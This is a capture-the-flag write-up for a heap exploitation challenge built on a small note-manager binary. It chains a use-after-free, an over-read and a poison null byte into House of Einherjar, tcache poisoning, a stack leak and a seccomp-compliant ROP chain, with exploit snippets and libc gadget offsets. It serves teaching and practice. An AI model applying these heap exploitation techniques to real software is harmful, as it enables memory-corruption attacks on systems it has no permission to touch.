# Original Unlimited Codex 100% Free

**Category:** Pwn · **Points:** 1000

> Claim your Free Unlimited Codex Here 💑 &nbsp; `nc 34.82.235.213 1337`

**Flag:** `kBxAc{~~p4y1ng_f0r_5u65cr1p+10n_15_n0+_t#3_0n1y_w4y_70_g37_c0d3x_y0u_c4n_51mp|y_ju57_51mply_d0wnl04d_fr33_unl1m173d_v3r510n_fr0m_1n73rn37~~}`

> **Binary:** `unlimited_codex_for_free` (committed). Built against **glibc 2.43 / ld-2.43** — use the matching libc to reproduce the offsets; it is not committed here.

---

This challenge is a menu-driven heap pwn. The interface dresses everything up as a cursed library, but under the theme it is essentially a small note manager:

- `scribe` creates a note.
- `amend` edits a note.
- `read` prints a note.
- `bind` makes another slot point at the same note.
- `burn` frees a note.
- `index` lists occupied slots.

The final exploit combines several smaller bugs:

1. `bind` leaves a readable dangling pointer after a note is freed.
2. `read` permits 32 bytes more than the original allocation size.
3. `amend` writes a trailing null byte one byte beyond the requested area.
4. That null byte enables a **House of Einherjar** heap overlap.
5. The overlap lets us poison tcache lists and make `malloc` return addresses of our choice.
6. We leak the stack through libc's `environ`, overwrite `main`'s saved return address, and run an `openat/read/write` ROP chain.

The completed exploit is in [`solve.py`](./solve.py).

---

## First look

The archive contains the binary and its exact loader/libc:

```text
Dockerfile
flag.txt
ld-2.43.so
libc.so.6
unlimited_codex_for_free
```

The important binary protections are:

```text
Architecture: amd64
PIE:          enabled
NX:           enabled
Canary:       enabled
RELRO:        full
```

In plain English:

- We do not initially know where the program or libc lives in memory.
- We cannot execute bytes placed directly on the heap or stack.
- A stack canary makes an ordinary stack-buffer overflow awkward.
- The GOT is read-only, so the classic “overwrite a GOT function pointer” route is unavailable.

The program also installs a seccomp filter. Most importantly, `execve` is not allowed, so simply calling `system("/bin/sh")` would not work. The filter does allow `openat`, `read`, and `write`, which is exactly enough to open `flag.txt` and print it.

---

## Reconstructing the note structure

There are 32 entries in a global array. Each entry is 24 bytes and looks like this:

```c
struct note {
    char *data;       // +0x00
    size_t size;      // +0x08
    unsigned char state; // +0x10
};
```

The state values are effectively:

```text
0 = empty
1 = normal/owned allocation
2 = alias made by bind
```

The interesting operations can be simplified to the following pseudocode.

### `scribe index size`

```c
if (index > 31 || size < 24 || size > 0x1000 || notes[index].data != NULL)
    exit(1);

notes[index].data = malloc(size);
read_exact(0, notes[index].data, size);
notes[index].size = size;
notes[index].state = 1;
```

### `bind destination source`

```c
if (destination > 31 || source > 31)
    exit(1);
if (notes[destination].data != NULL || notes[source].data == NULL)
    exit(1);

notes[destination].data = notes[source].data;
notes[destination].size = notes[source].size;
notes[destination].state = 2;
```

This creates two slots that point to the same heap allocation.

### `burn index`

```c
if (index > 31 || notes[index].data == NULL || notes[index].state != 1)
    exit(1);

free(notes[index].data);
notes[index].data = NULL;
notes[index].size = 0;
notes[index].state = 0;
```

Only the original state-1 entry is cleared. Any state-2 alias created with `bind` continues to contain the freed address. That is a use-after-free pointer.

### `read index length`

```c
if (index > 31 || notes[index].data == NULL || length == 0)
    exit(1);
if (length > notes[index].size + 0x20)
    exit(1);

write(1, notes[index].data, length);
```

This allows us to read **32 bytes beyond** the declared allocation size.

### `amend index length`

```c
if (index > 31 || notes[index].state != 1)
    exit(1);
if (length < 24 || length > notes[index].size)
    exit(1);

read_exact(0, notes[index].data, length);

if (length == notes[index].size)
    notes[index].data[length] = '\0';
```

That final line is the other major bug. When we edit exactly the original requested size, the program writes a null byte immediately afterward.

---

## A short heap allocator explanation

glibc's allocator places a small header before every heap allocation. On 64-bit Linux, a typical allocated chunk looks like:

```text
              chunk header                 user allocation
        +-------------------------+------------------------------+
        | prev_size | size/flags  | bytes returned by malloc... |
        +-------------------------+------------------------------+
                                  ^
                                  pointer returned by malloc
```

The lowest bit of the next chunk's size field is called `PREV_INUSE`. If it is set, glibc believes the previous chunk is allocated. If it is clear, glibc believes the previous chunk is free and may merge backward into it.

For requests whose size is `8 mod 16`, such as `0x108`, the requested bytes occupy every usable byte up to the next chunk's size field. Consequently:

```c
data[0x108] = '\0';
```

clears the low byte of the next chunk's size. In our chosen layout, that changes:

```text
0x501 -> 0x500
```

This removes the `PREV_INUSE` flag while keeping a believable chunk size.

---

## Step 1: leak an exact heap address

Modern glibc “safe-links” pointers stored in tcache. A tcache forward pointer is encoded approximately as:

```c
encoded_next = real_next ^ (current_entry_address >> 12);
```

We allocate two 24-byte chunks, create aliases to both, and free the originals:

```python
c.scribe(0, 0x18, b"A" * 0x18)
c.bind(1, 0)
c.scribe(2, 0x18, b"B" * 0x18)
c.bind(3, 2)
c.burn(0)
c.burn(2)
```

The aliases in slots 1 and 3 are still readable even though their chunks are in tcache.

The first freed chunk points to null. Its encoded `next` is therefore only its own address shifted right by 12:

```python
key = u64(c.read(1, 8))
```

The second freed chunk points to the first, so decoding its forward pointer gives the first chunk's exact address:

```python
encoded_p0 = u64(c.read(3, 8))
p0 = encoded_p0 ^ key
assert key == p0 >> 12
```

We then allocate the two entries again so that the small tcache bin is empty and the heap layout is predictable.

One glibc 2.43-specific detail matters here: the first free lazily creates a `0x300`-byte per-thread tcache object. With the supplied libc, the next useful allocation is therefore at:

```python
A = p0 + 0x340
```

Using the exact provided libc is important because offsets and allocator behavior can differ across versions.

---

## Step 2: create a fake free chunk

We make three adjacent allocations:

```text
A: request 0x108 bytes
B: request 0x4f8 bytes
C: small guard chunk
```

Their relevant layout is:

```text
A user data
|
| fake chunk header and links
| ...
| offset 0x100: B.prev_size = 0x100
| offset 0x108: B.size = 0x501
|               ^ amend's extra null changes this to 0x500
v
B
v
C guard
```

Inside A, we construct a fake free chunk beginning exactly at A's user pointer:

```python
fake = bytearray(b"\0" * 0x108)
fake[0x08:0x10] = p64(0x101) # fake chunk size: 0x100 plus PREV_INUSE
fake[0x10:0x18] = p64(A)     # fake fd
fake[0x18:0x20] = p64(A)     # fake bk
fake[0x100:0x108] = p64(0x100) # B.prev_size
c.amend(4, 0x108, bytes(fake))
```

The self-referencing `fd` and `bk` values satisfy glibc's unlink consistency checks:

```text
fake->fd->bk == fake
fake->bk->fd == fake
```

The automatic null byte clears B's `PREV_INUSE` flag. When B is freed, glibc now believes a free `0x100`-byte chunk exists immediately before it. It unlinks our fake chunk and merges it with B.

The important mistake from glibc's point of view is that A is still considered allocated by the program, even though a large allocator-managed free chunk now starts inside A. We have created overlapping views of the same memory.

This technique is commonly called **House of Einherjar**.

---

## Step 3: leak libc

The merged chunk is large enough to enter the unsorted bin. Unsorted-bin chunks contain forward and backward pointers into libc's `main_arena`.

Because slot 4 still points into the overlapping region, we read those pointers directly:

```python
leak = c.read(4, 0x30)
arena = u64(leak[0x10:0x18])
libc = arena - 0x1e7ac8
```

For the supplied `libc.so.6`, the unsorted-bin leak is at offset `0x1e7ac8` from the libc base.

At this point we know both the heap base area and the libc base.

---

## Step 4: turn the overlap into tcache poisoning

We split the overlapping free region into several allocations. The useful ones are:

```text
D:  0x20-byte chunk, keeps the beginning allocated
E:  0x20-byte chunk, used as a poisonable tcache head
L:  0x100-byte chunk, used as another poisonable tcache head
E2: second 0x20-byte chunk
L2: second 0x100-byte chunk
```

In terms of known addresses:

```python
D  = A + 0x10
E  = A + 0x30
L  = A + 0x50
E2 = A + 0x150
L2 = A + 0x170
```

We free `E2` followed by `E`, and `L2` followed by `L`. That produces two-entry tcache lists:

```text
0x20 bin:  E -> E2
0x100 bin: L -> L2
```

Why do we need two entries? tcache keeps a separate count. If a bin contained only one entry, consuming its poisoned head would reduce the count to zero and glibc would ignore our forged second pointer. With two entries, the first allocation leaves a count of one, so the next allocation follows the pointer we supplied.

Slot 4 still allows us to edit A's original `0x108` bytes, which overlap E's and L's tcache metadata. We can therefore replace their safe-linked `next` pointers:

```python
encoded_target = target ^ (entry_address >> 12)
```

After that, two allocations of the matching size behave like this:

```text
first malloc  -> returns the genuine E or L chunk
second malloc -> returns our chosen target address
```

That is the key primitive: we can make `malloc` return a suitably aligned writable address of our choice.

---

## Step 5: leak the stack with `environ`

libc exports a global variable named `environ`. The variable contains a pointer into the process's initial stack, where the environment pointer array lives.

Its address is:

```python
environ = libc + 0x1eede8
```

There is one complication: `scribe` always writes at least 24 bytes into the pointer returned by `malloc`. If we returned `environ` itself, we would destroy the stack pointer before we could read it.

Instead, we target exactly 24 bytes before it:

```python
env_target = environ - 0x18
```

This address is 16-byte aligned, as required by tcache. A 24-byte `scribe` fills the harmless space immediately before `environ` but stops just before the variable itself.

The challenge's over-read now becomes very useful. A 24-byte note may be read for up to `24 + 32 = 56` bytes:

```python
c.scribe(7, 0x18, b"x" * 0x18)       # consumes real E
c.scribe(9, 0x18, b"\0" * 0x18)      # allocation at environ-0x18
env_dump = c.read(9, 0x38)
stack_envp = u64(env_dump[0x18:0x20])
```

The pointer at offset `0x18` is the untouched value of `environ`, giving us a stack address.

In this binary's stable `main` stack frame, the saved RBP is `0x138` bytes below the leaked environment-array address:

```python
stack_target = stack_envp - 0x138
```

The saved return address is eight bytes after that.

---

## Step 6: overwrite `main`'s return address

We repeat the tcache poisoning process using the preserved `0x100` bin. L's poisoned `next` pointer is set to the calculated stack target:

```python
overlap[0x50:0x58] = p64(stack_target ^ (L >> 12))
c.amend(4, 0x108, bytes(overlap))
```

The next two `0xf8`-byte allocations return:

1. The genuine L chunk.
2. `main`'s saved-RBP address on the stack.

We use L itself to store `flag.txt` and a buffer for the flag:

```python
heap_io = bytearray(b"\0" * 0xf8)
heap_io[0:9] = b"flag.txt\0"
c.scribe(8, 0xf8, bytes(heap_io))
```

The second allocation writes a ROP chain over the saved RBP and return address. Notice that the stack canary is located immediately before the saved RBP, so our targeted write never changes it. The canary check still passes normally.

---

## Step 7: seccomp-friendly ROP

Because `execve` is blocked, the payload performs an ORW sequence:

```text
openat(AT_FDCWD, "flag.txt", O_RDONLY)
read(returned_fd, heap_buffer, 0x100)
write(STDOUT_FILENO, heap_buffer, 0x100)
```

The chain uses direct syscall gadgets from the supplied libc. The most useful gadgets are:

```python
pop_rdi       = libc + 0x2aaf7
pop_rsi       = libc + 0x29e69
pop_rax       = libc + 0x43ee6
pop_rdx_rbx   = libc + 0x91665
xchg_edi_eax  = libc + 0x17d336
syscall_ret   = libc + 0x921b2
```

After `openat`, the returned file descriptor is in `eax`. The `xchg edi, eax; ret` gadget moves it into `edi`, ready for `read`, so the exploit does not have to guess whether the new descriptor will be 3, 4, or something else.

Finally, we send `quit`. `main` verifies its untouched canary, executes `leave; ret`, and begins our ROP chain.

---

## Running the exploit

Local test using the bundled loader and libc:

```bash
python3 solve.py
```

Expected result:

```text
[+] flag = kBxAc{TEST_FLAG}
```

Remote:

```bash
python3 solve.py 34.82.235.213 1337
```

---

## Flag

```text
kBxAc{~~p4y1ng_f0r_5u65cr1p+10n_15_n0+_t#3_0n1y_w4y_70_g37_c0d3x_y0u_c4n_51mp|y_ju57_51mply_d0wnl04d_fr33_unl1m173d_v3r510n_fr0m_1n73rn37~~}
```

## Final thoughts

The fun part of this challenge is that no single bug immediately gives code execution. `bind` only gives a dangling read, `read` only gives a small over-read, and `amend` only gives one null byte. Chained together, though, they reveal heap addresses, confuse glibc's view of the heap, create overlapping allocations, and ultimately turn `malloc` into an arbitrary-address write primitive.

In shorter form, the full path is:

```text
bind UAF
  -> safe-link heap leak
  -> poison null byte
  -> House of Einherjar overlap
  -> unsorted-bin libc leak
  -> tcache poisoning
  -> environ stack leak
  -> saved return-address overwrite
  -> openat/read/write ROP
  -> flag
```
